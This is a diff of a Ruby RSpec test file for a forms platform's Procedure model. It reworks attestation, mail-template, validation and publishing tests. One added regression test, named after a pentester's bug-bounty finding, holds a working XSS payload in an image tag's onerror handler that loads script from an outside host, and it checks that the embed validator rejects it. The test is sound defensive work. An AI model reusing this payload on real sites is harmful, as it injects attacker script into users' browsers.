@@ -52,14 +52,15 @@ describe Procedure do
         subject.save
         subject.reload
       end
-      it { expect(subject.passer_en_construction_email_template.body).to eq('toto') }
-
-      it { expect(Mails::InitiatedMail.count).to eq(1) }
+      it do
+        expect(subject.passer_en_construction_email_template.body).to eq('toto')
+        expect(Mails::InitiatedMail.count).to eq(1)
+      end
     end
   end
 
   describe 'closed mail template body' do
-    let(:procedure) { create(:procedure, attestation_template: attestation_template) }
+    let(:procedure) { create(:procedure, attestation_acceptation_template: attestation_template) }
     let(:attestation_template) { nil }
 
     subject { procedure.accepter_email_template.rich_body.body.to_html }
@@ -85,16 +86,43 @@ describe Procedure do
     end
   end
 
-  describe '#closed_mail_template_attestation_inconsistency_state' do
-    let(:procedure_without_attestation) { create(:procedure, closed_mail: closed_mail, attestation_template: nil) }
-    let(:procedure_with_active_attestation) do
-      create(:procedure, closed_mail: closed_mail, attestation_template: build(:attestation_template, activated: true))
-    end
-    let(:procedure_with_inactive_attestation) do
-      create(:procedure, closed_mail: closed_mail, attestation_template: build(:attestation_template, activated: false))
+  describe 'refused mail template body' do
+    let(:procedure) { create(:procedure, attestation_refus_template: attestation_template) }
+    let(:attestation_template) { nil }
+
+    subject { procedure.refuser_email_template.rich_body.body.to_html }
+
+    context 'for procedures without an attestation' do
+      it { is_expected.not_to include('lien attestation') }
     end
 
-    subject { procedure.closed_mail_template_attestation_inconsistency_state }
+    context 'for procedures with an attestation' do
+      let(:attestation_template) { build(:attestation_template, activated: activated, kind: 'refus') }
+
+      context 'when the attestation is inactive' do
+        let(:activated) { false }
+
+        it { is_expected.not_to include('lien attestation') }
+      end
+
+      context 'when the attestation is inactive' do
+        let(:activated) { true }
+
+        it { is_expected.to include('lien attestation') }
+      end
+    end
+  end
+
+  describe '#mail_template_attestation_inconsistency_state with closed_mail' do
+    let(:procedure_without_attestation) { create(:procedure, closed_mail: closed_mail, attestation_acceptation_template: nil) }
+    let(:procedure_with_active_attestation) do
+      create(:procedure, closed_mail: closed_mail, attestation_acceptation_template: build(:attestation_template, activated: true))
+    end
+    let(:procedure_with_inactive_attestation) do
+      create(:procedure, closed_mail: closed_mail, attestation_acceptation_template: build(:attestation_template, activated: false))
+    end
+
+    subject { procedure.mail_template_attestation_inconsistency_state(:acceptation) }
 
     context 'with a custom mail template' do
       context 'that contains a lien attestation tag' do
@@ -103,19 +131,22 @@ describe Procedure do
         context 'when the procedure doesn’t have an attestation' do
           let(:procedure) { procedure_without_attestation }
 
-          it { is_expected.to eq(:extraneous_tag) }
+          it do
+            expect(subject).to eq(:extraneous_tag)
+          end
         end
 
         context 'when the procedure has an active attestation' do
           let(:procedure) { procedure_with_active_attestation }
-
-          it { is_expected.to be(nil) }
+          it { is_expected.to be_nil }
         end
 
         context 'when the procedure has an inactive attestation' do
           let(:procedure) { procedure_with_inactive_attestation }
 
-          it { is_expected.to eq(:extraneous_tag) }
+          it do
+            expect(subject).to eq(:extraneous_tag)
+          end
         end
       end
 
@@ -124,43 +155,82 @@ describe Procedure do
 
         context 'when the procedure doesn’t have an attestation' do
           let(:procedure) { procedure_without_attestation }
-
-          it { is_expected.to be(nil) }
+          it { is_expected.to be_nil }
         end
 
         context 'when the procedure has an active attestation' do
           let(:procedure) { procedure_with_active_attestation }
 
-          it { is_expected.to eq(:missing_tag) }
+          it do
+            expect(subject).to eq(:missing_tag)
+          end
+        end
+
+        context 'when the procedure has an inactive attestation' do
+          let(:procedure) { procedure_with_inactive_attestation }
+          it { is_expected.to be_nil }
+        end
+      end
+    end
+  end
+
+  describe '#mail_template_attestation_inconsistency_state with refused_mail' do
+    let(:procedure_without_attestation) { create(:procedure, refused_mail: refused_mail, attestation_refus_template: nil) }
+    let(:procedure_with_active_attestation) do
+      create(:procedure, refused_mail: refused_mail, attestation_refus_template: build(:attestation_template, activated: true, kind: 'refus'))
+    end
+    let(:procedure_with_inactive_attestation) do
+      create(:procedure, refused_mail: refused_mail, attestation_refus_template: build(:attestation_template, activated: false, kind: 'refus'))
+    end
+
+    subject { procedure.mail_template_attestation_inconsistency_state(:refus) }
+
+    context 'with a custom mail template' do
+      context 'that contains a lien attestation tag' do
+        let(:refused_mail) { build(:refused_mail, body: '--lien attestation--') }
+
+        context 'when the procedure doesn’t have an attestation' do
+          let(:procedure) { procedure_without_attestation }
+
+          it do
+            expect(subject).to eq(:extraneous_tag)
+          end
+        end
+
+        context 'when the procedure has an active attestation' do
+          let(:procedure) { procedure_with_active_attestation }
+          it { is_expected.to be_nil }
         end
 
         context 'when the procedure has an inactive attestation' do
           let(:procedure) { procedure_with_inactive_attestation }
 
-          it { is_expected.to be(nil) }
+          it do
+            expect(subject).to eq(:extraneous_tag)
+          end
         end
       end
-    end
 
-    context 'with the default mail template' do
-      let(:closed_mail) { nil }
+      context 'that doesn’t contain a lien attestation tag' do
+        let(:refused_mail) { build(:refused_mail) }
 
-      context 'when the procedure doesn’t have an attestation' do
-        let(:procedure) { procedure_without_attestation }
+        context 'when the procedure doesn’t have an attestation' do
+          let(:procedure) { procedure_without_attestation }
+          it { is_expected.to be_nil }
+        end
 
-        it { is_expected.to be(nil) }
-      end
+        context 'when the procedure has an active attestation' do
+          let(:procedure) { procedure_with_active_attestation }
 
-      context 'when the procedure has an active attestation' do
-        let(:procedure) { procedure_with_active_attestation }
+          it do
+            expect(subject).to eq(:missing_tag)
+          end
+        end
 
-        it { is_expected.to be(nil) }
-      end
-
-      context 'when the procedure has an inactive attestation' do
-        let(:procedure) { procedure_with_inactive_attestation }
-
-        it { is_expected.to be(nil) }
+        context 'when the procedure has an inactive attestation' do
+          let(:procedure) { procedure_with_inactive_attestation }
+          it { is_expected.to be_nil }
+        end
       end
     end
   end
@@ -177,9 +247,11 @@ describe Procedure do
 
   describe 'validation' do
     context 'libelle' do
-      it { is_expected.not_to allow_value(nil).for(:libelle) }
-      it { is_expected.not_to allow_value('').for(:libelle) }
-      it { is_expected.to allow_value('Demande de subvention').for(:libelle) }
+      it do
+        is_expected.not_to allow_value(nil).for(:libelle)
+        is_expected.not_to allow_value('').for(:libelle)
+        is_expected.to allow_value('Demande de subvention').for(:libelle)
+      end
     end
 
     context 'closing procedure' do
@@ -197,9 +269,11 @@ describe Procedure do
     end
 
     context 'description' do
-      it { is_expected.not_to allow_value(nil).for(:description) }
-      it { is_expected.not_to allow_value('').for(:description) }
-      it { is_expected.to allow_value('Description Demande de subvention').for(:description) }
+      it do
+        is_expected.not_to allow_value(nil).for(:description)
+        is_expected.not_to allow_value('').for(:description)
+        is_expected.to allow_value('Description Demande de subvention').for(:description)
+      end
     end
 
     context 'organisation' do
@@ -225,8 +299,10 @@ describe Procedure do
     end
 
     context 'juridique' do
-      it { is_expected.not_to allow_value(nil).on(:publication).for(:cadre_juridique) }
-      it { is_expected.to allow_value('text').on(:publication).for(:cadre_juridique) }
+      it do
+        is_expected.not_to allow_value(nil).on(:publication).for(:cadre_juridique)
+        is_expected.to allow_value('text').on(:publication).for(:cadre_juridique)
+      end
 
       context 'with deliberation' do
         let(:procedure) { build(:procedure, cadre_juridique: nil, revisions: [build(:procedure_revision)]) }
@@ -257,54 +333,56 @@ describe Procedure do
       end
     end
 
-    context 'api_entreprise_token' do
-      let(:valid_token) { "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" }
-      let(:invalid_token) { 'plouf' }
-      it { is_expected.to allow_value(valid_token).for(:api_entreprise_token) }
-      it { is_expected.not_to allow_value(invalid_token).for(:api_entreprise_token) }
-    end
-
     context 'api_particulier_token' do
       let(:valid_token) { "3841b13fa8032ed3c31d160d3437a76a" }
       let(:invalid_token) { 'jet0n 1nvalide' }
-      it { is_expected.to allow_value(valid_token).for(:api_particulier_token) }
-      it { is_expected.not_to allow_value(invalid_token).for(:api_particulier_token) }
+      it do
+        is_expected.to allow_value(valid_token).for(:api_particulier_token)
+        is_expected.not_to allow_value(invalid_token).for(:api_particulier_token)
+      end
     end
 
     context 'monavis' do
-      context 'nil is allowed' do
-        it { is_expected.to allow_value(nil).for(:monavis_embed) }
-        it { is_expected.to allow_value('').for(:monavis_embed) }
-      end
+      subject { procedure.tap { it.validate(:publication) }.errors.full_messages }
 
       context 'random string is not allowed' do
         let(:procedure) { build(:procedure, monavis_embed: "plop") }
-        it { expect(procedure.valid?).to eq(false) }
+        it { is_expected.to eq(["Le code MonAvis doit comporter un lien", "Le code MonAvis doit comporter une image"]) }
       end
 
       context 'random html is not allowed' do
         let(:procedure) { build(:procedure, monavis_embed: '<img src="http://some.analytics/hello.gif">') }
-        it { expect(procedure.valid?).to eq(false) }
+        it { is_expected.to include("Le code MonAvis contient une image pointont vers un domaine invalide") }
       end
 
       context 'Monavis embed code with white button is allowed' do
         monavis_blanc = <<-MSG
-        <a href="https://monavis.numerique.gouv.fr/Demarches/123?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d475e4045666057f">
-          <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-blanc.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
+        <a href="https://jedonnemonavis.numerique.gouv.fr/Demarches/123?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d475e4045666057f">
+          <img src="https://jedonnemonavis.numerique.gouv.fr/monavis-static/bouton-blanc.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
         </a>
         MSG
         let(:procedure) { build(:procedure, monavis_embed: monavis_blanc) }
-        it { expect(procedure.valid?).to eq(true) }
+        it { is_expected.to eq([]) }
       end
 
       context 'Monavis embed code with blue button is allowed' do
         monavis_bleu = <<-MSG
+        <a href="https://jedonnemonavis.numerique.gouv.fr/Demarches/123?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d475e4045666057f">
+          <img src="https://jedonnemonavis.numerique.gouv.fr/monavis-static/bouton-bleu.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
+        </a>
+        MSG
+        let(:procedure) { build(:procedure, monavis_embed: monavis_bleu) }
+        it { is_expected.to eq([]) }
+      end
+
+      context 'Monavis embed code with old monavis domain still works (backward compatibility)' do
+        monavis_old = <<-MSG
         <a href="https://monavis.numerique.gouv.fr/Demarches/123?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d475e4045666057f">
           <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
         </a>
         MSG
-        let(:procedure) { build(:procedure, monavis_embed: monavis_bleu) }
-        it { expect(procedure.valid?).to eq(true) }
+        let(:procedure) { build(:procedure, monavis_embed: monavis_old) }
+        it { is_expected.to eq([]) }
       end
 
       context 'Monavis embed code with voxusages is allowed' do
@@ -314,7 +392,7 @@ describe Procedure do
         </a>
         MSG
         let(:procedure) { build(:procedure, monavis_embed: monavis_issue_phillipe) }
-        it { expect(procedure.valid?).to eq(true) }
+        it { is_expected.to eq([]) }
       end
 
       context 'Monavis embed code without title allowed' do
@@ -324,7 +402,7 @@ describe Procedure do
           </a>
         MSG
         let(:procedure) { build(:procedure, monavis_embed: monavis_issue_bouchra) }
-        it { expect(procedure.valid?).to eq(true) }
+        it { is_expected.to eq([]) }
       end
 
       context 'Monavis embed code with jedonnemonavis' do
@@ -334,7 +412,7 @@ describe Procedure do
           </a>
         MSG
         let(:procedure) { build(:procedure, monavis_embed: monavis_jedonnemonavis) }
-        it { expect(procedure.valid?).to eq(true) }
+        it { is_expected.to eq([]) }
       end
 
       context 'Monavis embed code with kthxbye' do
@@ -344,7 +422,16 @@ describe Procedure do
           </a>
         MSG
         let(:procedure) { build(:procedure, monavis_embed: monavis_jedonnemonavis) }
-        it { expect(procedure.valid?).to eq(false) }
+        it { is_expected.to eq(["Le code MonAvis contient un lien pointant vers un domaine invalide"]) }
+      end
+
+      context 'when YWH-PGM5381-46 pentester won' do
+        monavis_ywh_pgm5381_46 = <<-MSG
+         <a href="https://monavis.numerique.gouv.fr/Demarches/123456?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d4"></a>
+         <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.pngx" alt="x" onerror=import('https://hks.ec/ATOXSS-ze4fzfze54.js') />
+        MSG
+        let(:procedure) { build(:procedure, monavis_embed: monavis_ywh_pgm5381_46) }
+        it { is_expected.to eq(["Le code MonAvis contient un attribut interdit : onerror"]) }
       end
     end
 
@@ -352,20 +439,24 @@ describe Procedure do
       let(:field_name) { :duree_conservation_dossiers_dans_ds }
       context 'by default is caped to 12' do
         subject { create(:procedure, duree_conservation_dossiers_dans_ds: 12, max_duree_conservation_dossiers_dans_ds: 12) }
-        it { is_expected.not_to allow_value(nil).for(field_name) }
-        it { is_expected.not_to allow_value('').for(field_name) }
-        it { is_expected.not_to allow_value('trois').for(field_name) }
-        it { is_expected.to allow_value(3).for(field_name) }
-        it { is_expected.to validate_numericality_of(field_name).is_less_than_or_equal_to(12) }
+        it do
+          is_expected.not_to allow_value(nil).for(field_name)
+          is_expected.not_to allow_value('').for(field_name)
+          is_expected.not_to allow_value('trois').for(field_name)
+          is_expected.to allow_value(3).for(field_name)
+          is_expected.to validate_numericality_of(field_name).is_less_than_or_equal_to(12)
+        end
       end
       context 'can be over riden' do
         subject { create(:procedure, duree_conservation_dossiers_dans_ds: 60, max_duree_conservation_dossiers_dans_ds: 60) }
-        it { is_expected.not_to allow_value(nil).for(field_name) }
-        it { is_expected.not_to allow_value('').for(field_name) }
-        it { is_expected.not_to allow_value('trois').for(field_name) }
-        it { is_expected.to allow_value(3).for(field_name) }
-        it { is_expected.to allow_value(60).for(field_name) }
-        it { is_expected.to validate_numericality_of(field_name).is_less_than_or_equal_to(60) }
+        it do
+          is_expected.not_to allow_value(nil).for(field_name)
+          is_expected.not_to allow_value('').for(field_name)
+          is_expected.not_to allow_value('trois').for(field_name)
+          is_expected.to allow_value(3).for(field_name)
+          is_expected.to allow_value(60).for(field_name)
+          is_expected.to validate_numericality_of(field_name).is_less_than_or_equal_to(60)
+        end
       end
     end
 
@@ -699,7 +790,7 @@ describe Procedure do
     context 'when publishing a new procedure' do
       before do
         travel_to(now) do
-          procedure.publish!
+          procedure.publish!(procedure.administrateurs.first)
         end
       end
 
@@ -727,7 +818,7 @@ describe Procedure do
 
       before do
         travel_to(now) do
-          procedure.publish!(canonical_procedure)
+          procedure.publish!(procedure.administrateurs.first, canonical_procedure)
         end
       end
 
@@ -845,7 +936,8 @@ describe Procedure do
   end
 
   describe "#publish_revision!" do
-    let(:procedure) { create(:procedure, :published) }
+    let(:administrateur) { create(:administrateur) }
+    let(:procedure) { create(:procedure, :published, administrateurs: [administrateur]) }
     let(:tdc_attributes) { { type_champ: :number, libelle: 'libelle 1' } }
     let(:publication_date) { Time.zone.local(2021, 1, 1, 12, 00, 00) }
 
@@ -855,7 +947,7 @@ describe Procedure do
 
     subject do
       travel_to(publication_date) do
-        procedure.publish_revision!
+        procedure.publish_revision!(administrateur)
       end
     end
 
@@ -872,6 +964,13 @@ describe Procedure do
       expect(procedure.draft_revision.revision_types_de_champ_public).to be_present
       expect(procedure.draft_revision.types_de_champ_public).to be_present
       expect(procedure.draft_revision.types_de_champ_public.first.libelle).to eq('libelle 1')
+    end
+
+    it 'records the publishing administrateur' do
+      subject
+
+      expect(procedure.published_revision.administrateur).to eq(administrateur)
+      expect(procedure.draft_revision.administrateur).to be_nil
     end
 
     context 'when the procedure has dossiers' do
@@ -925,7 +1024,7 @@ describe Procedure do
         create(
           :procedure,
           :published,
-          attestation_template: build(:attestation_template),
+          attestation_acceptation_template: build(:attestation_template),
           dossier_submitted_message: create(:dossier_submitted_message),
           types_de_champ_public: [{ type: :text, libelle: 'published tdc' }]
         )
@@ -934,7 +1033,7 @@ describe Procedure do
       it "should reset draft revision" do
         procedure.draft_revision.add_type_de_champ(tdc_attributes)
         previous_draft_revision = procedure.draft_revision
-        previous_attestation_template = procedure.attestation_template
+        previous_attestation_template = procedure.attestation_acceptation_template
         previous_dossier_submitted_message = previous_draft_revision.dossier_submitted_message
 
         expect(procedure.draft_changed?).to be_truthy
@@ -942,7 +1041,7 @@ describe Procedure do
         expect(procedure.draft_changed?).to be_falsey
         expect(procedure.draft_revision).not_to eq(previous_draft_revision)
         expect { previous_draft_revision.reload }.to raise_error(ActiveRecord::RecordNotFound)
-        expect(procedure.attestation_template).to eq(previous_attestation_template)
+        expect(procedure.attestation_acceptation_template).to eq(previous_attestation_template)
         expect(procedure.draft_revision.dossier_submitted_message).to eq(previous_dossier_submitted_message)
       end
 
@@ -988,10 +1087,12 @@ describe Procedure do
     let(:procedure_close) { build(:procedure, :closed) }
     let(:procedure_depubliee) { build(:procedure, :unpublished) }
 
-    it { expect(procedure_brouillon.brouillon?).to be_truthy }
-    it { expect(procedure_publiee.brouillon?).to be_falsey }
-    it { expect(procedure_close.brouillon?).to be_falsey }
-    it { expect(procedure_depubliee.brouillon?).to be_falsey }
+    it do
+      expect(procedure_brouillon.brouillon?).to be_truthy
+      expect(procedure_publiee.brouillon?).to be_falsey
+      expect(procedure_close.brouillon?).to be_falsey
+      expect(procedure_depubliee.brouillon?).to be_falsey
+    end
   end
 
   describe "#publiee?" do
@@ -1000,10 +1101,12 @@ describe Procedure do
     let(:procedure_close) { build(:procedure, :closed) }
     let(:procedure_depubliee) { build(:procedure, :unpublished) }
 
-    it { expect(procedure_brouillon.publiee?).to be_falsey }
-    it { expect(procedure_publiee.publiee?).to be_truthy }
-    it { expect(procedure_close.publiee?).to be_falsey }
-    it { expect(procedure_depubliee.publiee?).to be_falsey }
+    it do
+      expect(procedure_brouillon.publiee?).to be_falsey
+      expect(procedure_publiee.publiee?).to be_truthy
+      expect(procedure_close.publiee?).to be_falsey
+      expect(procedure_depubliee.publiee?).to be_falsey
+    end
   end
 
   describe "#close?" do
@@ -1012,10 +1115,12 @@ describe Procedure do
     let(:procedure_close) { build(:procedure, :closed) }
     let(:procedure_depubliee) { build(:procedure, :unpublished) }
 
-    it { expect(procedure_brouillon.close?).to be_falsey }
-    it { expect(procedure_publiee.close?).to be_falsey }
-    it { expect(procedure_close.close?).to be_truthy }
-    it { expect(procedure_depubliee.close?).to be_falsey }
+    it do
+      expect(procedure_brouillon.close?).to be_falsey
+      expect(procedure_publiee.close?).to be_falsey
+      expect(procedure_close.close?).to be_truthy
+      expect(procedure_depubliee.close?).to be_falsey
+    end
   end
 
   describe "#depubliee?" do
@@ -1024,10 +1129,12 @@ describe Procedure do
     let(:procedure_close) { build(:procedure, :closed) }
     let(:procedure_depubliee) { build(:procedure, :unpublished) }
 
-    it { expect(procedure_brouillon.depubliee?).to be_falsey }
-    it { expect(procedure_publiee.depubliee?).to be_falsey }
-    it { expect(procedure_close.depubliee?).to be_falsey }
-    it { expect(procedure_depubliee.depubliee?).to be_truthy }
+    it do
+      expect(procedure_brouillon.depubliee?).to be_falsey
+      expect(procedure_publiee.depubliee?).to be_falsey
+      expect(procedure_close.depubliee?).to be_falsey
+      expect(procedure_depubliee.depubliee?).to be_truthy
+    end
   end
 
   describe "#locked?" do
@@ -1036,10 +1143,12 @@ describe Procedure do
     let(:procedure_close) { build(:procedure, :closed) }
     let(:procedure_depubliee) { build(:procedure, :unpublished) }
 
-    it { expect(procedure_brouillon.locked?).to be_falsey }
-    it { expect(procedure_publiee.locked?).to be_truthy }
-    it { expect(procedure_close.locked?).to be_truthy }
-    it { expect(procedure_depubliee.locked?).to be_truthy }
+    it do
+      expect(procedure_brouillon.locked?).to be_falsey
+      expect(procedure_publiee.locked?).to be_truthy
+      expect(procedure_close.locked?).to be_truthy
+      expect(procedure_depubliee.locked?).to be_truthy
+    end
   end
 
   describe 'close' do
@@ -1052,8 +1161,10 @@ describe Procedure do
       procedure.reload
     end
 
-    it { expect(procedure.close?).to be_truthy }
-    it { expect(procedure.closed_at).to eq(now) }
+    it do
+      expect(procedure.close?).to be_truthy
+      expect(procedure.closed_at).to eq(now)
+    end
 
     it 'sets published revision' do
       expect(procedure.published_revision).not_to be_nil
@@ -1137,15 +1248,19 @@ describe Procedure do
     context "when hidden_at is nil" do
       let(:hidden_at) { nil }
 
-      it { expect(Procedure.count).to eq(1) }
-      it { expect(Procedure.all).to include(procedure) }
+      it do
+        expect(Procedure.count).to eq(1)
+        expect(Procedure.all).to include(procedure)
+      end
     end
 
     context "when hidden_at is not nil" do
       let(:hidden_at) { 2.days.ago }
 
-      it { expect(Procedure.count).to eq(0) }
-      it { expect { Procedure.find(procedure.id) }.to raise_error(ActiveRecord::RecordNotFound) }
+      it do
+        expect(Procedure.count).to eq(0)
+        expect { Procedure.find(procedure.id) }.to raise_error(ActiveRecord::RecordNotFound)
+      end
     end
   end
 
@@ -1156,8 +1271,10 @@ describe Procedure do
     let!(:dossier2) { create(:dossier, procedure: procedure) }
     let(:instructeur) { create(:instructeur) }
 
-    it { expect(Dossier.count).to eq(2) }
-    it { expect(Dossier.all).to include(dossier, dossier2) }
+    it do
+      expect(Dossier.count).to eq(2)
+      expect(Dossier.all).to include(dossier, dossier2)
+    end
 
     context "when discarding procedure" do
       before do
@@ -1166,9 +1283,11 @@ describe Procedure do
         instructeur.reload
       end
 
-      it { expect(procedure.dossiers.count).to eq(0) }
-      it { expect(Dossier.count).to eq(0) }
-      it { expect(instructeur.followed_dossiers).not_to include(dossier) }
+      it do
+        expect(procedure.dossiers.count).to eq(0)
+        expect(Dossier.count).to eq(0)
+        expect(instructeur.followed_dossiers).not_to include(dossier)
+      end
     end
   end
 
@@ -1239,10 +1358,6 @@ describe Procedure do
   end
 
   describe '.missing_zones?' do
-    before do
-      Rails.application.config.ds_zonage_enabled = true
-    end
-
     let(:procedure) { create(:procedure, zones: []) }
 
     subject { procedure.missing_zones? }
@@ -1259,10 +1374,6 @@ describe Procedure do
   end
 
   describe '.missing_steps' do
-    before do
-      Flipper.enable :zonage
-    end
-
     subject { procedure.missing_steps.include?(step) }
 
     context 'without zone' do
@@ -1321,10 +1432,12 @@ describe Procedure do
   end
 
   describe 'lien_dpo' do
-    it { expect(build(:procedure).valid?).to be(true) }
-    it { expect(build(:procedure, lien_dpo: 'dpo@ministere.amere').valid?).to be(true) }
-    it { expect(build(:procedure, lien_dpo: 'https://legal.fr/contact_dpo').valid?).to be(true) }
-    it { expect(build(:procedure, lien_dpo: 'askjdlad l akdj asd ').valid?).to be(false) }
+    it do
+      expect(build(:procedure).valid?).to be(true)
+      expect(build(:procedure, lien_dpo: 'dpo@ministere.amere').valid?).to be(true)
+      expect(build(:procedure, lien_dpo: 'https://legal.fr/contact_dpo').valid?).to be(true)
+      expect(build(:procedure, lien_dpo: 'askjdlad l akdj asd ').valid?).to be(false)
+    end
   end
 
   describe 'factory' do
@@ -1546,7 +1659,7 @@ describe Procedure do
         create(:attestation_template, :v2, :draft, procedure: procedure)
       end
 
-      it { expect(subject.attestation_template.version).to eq(1) }
+      it { expect(subject.attestation_acceptation_template.version).to eq(1) }
     end
 
     context "when there is only a v1" do
@@ -1554,7 +1667,7 @@ describe Procedure do
         create(:attestation_template, procedure: procedure)
       end
 
-      it { expect(subject.attestation_template.version).to eq(1) }
+      it { expect(subject.attestation_acceptation_template.version).to eq(1) }
     end
 
     context "when there is only a v2" do
@@ -1562,7 +1675,7 @@ describe Procedure do
         create(:attestation_template, :v2, procedure: procedure)
       end
 
-      it { expect(subject.attestation_template.version).to eq(2) }
+      it { expect(subject.attestation_acceptation_template.version).to eq(2) }
     end
 
     context "when there is a v2 draft" do
@@ -1570,14 +1683,14 @@ describe Procedure do
         create(:attestation_template, :v2, :draft, procedure: procedure)
       end
 
-      it { expect(subject.attestation_template).to be_nil }
+      it { expect(subject.attestation_acceptation_template).to be_nil }
 
       context "and a published" do
         before do
           create(:attestation_template, :v2, :published, procedure: procedure)
         end
 
-        it { expect(subject.attestation_template).to be_published }
+        it { expect(subject.attestation_acceptation_template).to be_published }
       end
     end
   end
